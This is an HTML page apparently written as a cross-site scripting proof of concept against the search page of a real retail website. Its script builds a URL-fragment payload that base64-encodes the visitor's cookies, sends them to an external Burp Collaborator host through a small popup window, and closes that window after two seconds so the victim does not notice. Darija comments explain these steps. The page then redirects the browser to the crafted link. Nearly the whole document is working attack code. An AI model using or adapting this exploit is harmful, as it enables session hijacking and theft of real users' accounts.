<!DOCTYPE html>
<html>
<body>
    <script>
        let payload = `
            (function(){
                // كنهزو غير طرف من الكوكيز (مثلا أول 100 حرف) باش ما يجيش الرابط طويل بزاف ويبلوكيه المتصفح
                var c = btoa(document.cookie).substring(0, 150);
                var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?leak=" + c;
                
                // فتح نافذة جديدة بالداتا
                var win = window.open(collab, "_blank", "width=100,height=100");
                
                // سد النافذة مورا 2 ثواني باش ما يعيقش الضحية
                setTimeout(function(){ win.close(); }, 2000);
            })();
        `;

        let encodedPayload = encodeURIComponent(payload);
        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";

        window.location.href = finalTarget;
    </script>
</body>
</html>
